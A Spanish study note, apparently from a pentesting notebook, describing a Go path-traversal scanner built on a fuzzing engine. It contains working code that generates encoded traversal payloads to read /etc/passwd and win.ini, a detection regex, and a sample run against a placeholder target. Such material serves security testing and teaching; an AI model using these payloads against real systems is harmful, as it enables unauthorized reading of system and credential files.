---
tags:
  - Go
  - Go/Web
  - Path-Traversal
Descripción: "Un parámetro que nombra un fichero (?page=home.php, ?file=report.pdf) puede permitir salir del directorio con ../ y leer ficheros arbitrarios: /etc/passwd, config con…"
Fecha de actualización: 2026-07-26
Nota previa: "[[00 - Motor de fuzzing web]]"
Nota siguiente: "[[02 - Escáner de XSS reflejado]]"
Area: "[[Escáner de vulnerabilidades web.base|Escáner de vulnerabilidades web]]"
---
---

Un parámetro que nombra un fichero (`?page=home.php`, `?file=report.pdf`) puede permitir salir del directorio con `../` y leer ficheros arbitrarios: `/etc/passwd`, config con credenciales, código fuente. La teoría de *path traversal* / LFI (cómo funciona, wrappers, bypasses, RCE) vive en Red Team [[01 - Local File Inclusion (LFI)]] y [[02 - Bypasses básicos - traversal, null byte y encoding]]; aquí el escáner sobre el [[00 - Motor de fuzzing web|motor de fuzzing]].

> [!info]+ Fuente
> Receta "Automated URL-based Directory Traversal" de *Python Web Penetration Testing Cookbook* (2015), con variantes de encoding y detección por firma.

## Payloads: escalera y variantes de encoding

No basta con un `../etc/passwd`. Pruebas **profundidades crecientes** (no sabes cuántos niveles bajar) y **variantes de codificación** para saltar filtros ingenuos que solo buscan `../` literal:

```go
func traversalPayloads(target string) []string {
    var out []string
    prefixes := []string{
        "../", "..%2f", "%2e%2e%2f", "..%252f", "....//",   // literal, URL-enc, doble-enc, bypass
    }
    for _, p := range prefixes {
        seq := ""
        for depth := 1; depth <= 8; depth++ {   // sube de 1 a 8 niveles
            seq += p
            out = append(out, seq+target)
        }
    }
    return out
}
```

`traversalPayloads("etc/passwd")` genera `../etc/passwd`, `../../etc/passwd`, … y sus versiones codificadas. Para Windows cambias el objetivo a `windows/win.ini` con separador `..\` / `..%5c`.

## Matcher: firma del fichero, no el status

<mark style="background: #FF5582A6;">Un `200 OK` no prueba nada</mark> — la app puede devolver 200 con una página de error. Confirmas leyendo una **firma inequívoca** del contenido del fichero objetivo. Para `/etc/passwd`, el patrón `root:x:0:0:` (o `raíz` de cualquier línea `usuario:x:UID:GID:`):

```go
var passwdRe = regexp.MustCompile(`(?m)^[a-z_][-a-z0-9_]*:[^:]*:\d+:\d+:`)

func traversalMatcher(payload string, resp *http.Response, body []byte, _ time.Duration) (Finding, bool) {
    if passwdRe.Match(body) {
        return Finding{
            Payload:  payload,
            Status:   resp.StatusCode,
            Length:   int64(len(body)),
            Evidence: "firma /etc/passwd en la respuesta",
        }, true
    }
    return Finding{}, false
}
```

Para `win.ini` la firma es `[fonts]` o `[extensions]`. Enlazas plantilla + payloads + matcher y el motor hace el resto:

```go
t := Target{Method: http.MethodGet, URL: "https://target.tld/view?file=§FUZZ§"}
findings := Fuzz(ctx, t, traversalPayloads("etc/passwd"), traversalMatcher, client, 10, 20)
```

## Modernizaciones sobre el recetario

- <mark style="background: #8000E1A6;">Detección por firma de contenido</mark>, no por status ni por longitud a ojo — cero falsos positivos.
- **Batería de encodings** (`%2f`, doble-encoding `%252f`, `....//`) para saltar filtros que el original no contempla.
- **Escalera de profundidad** automática en vez de un `../` fijo.
- **Regex de `passwd` robusta** (`(?m)` multilínea, formato real de la línea) en vez de buscar el string `"root"`, que aparece en mil sitios legítimos.

> [!warning]+ Traversal vs LFI vs RFI
> Este escáner detecta **lectura de ficheros** (traversal). Que puedas leer no significa RCE: para ejecutar necesitas wrappers PHP (`php://filter`, `data://`), log poisoning o filter chains — todo eso, con su explotación, está en Red Team [[04 - PHP wrappers II - RCE y filter chains]]. El escáner marca el punto de entrada; la explotación es el siguiente paso manual.

> [!info]+ Arsenal y validación
> `ffuf` con wordlist de traversal + filtro por regex, o `nuclei` con plantillas de LFI. La automatización dedicada del tema, en Red Team [[08 - Detección y fuzzing automatizado]]. Valida siempre a mano antes de reportar (Red Team [[22 - Validación de hallazgos]]).

El siguiente escáner busca lo contrario —que tu input vuelva **al navegador de la víctima**— con XSS reflejado → [[02 - Escáner de XSS reflejado]].
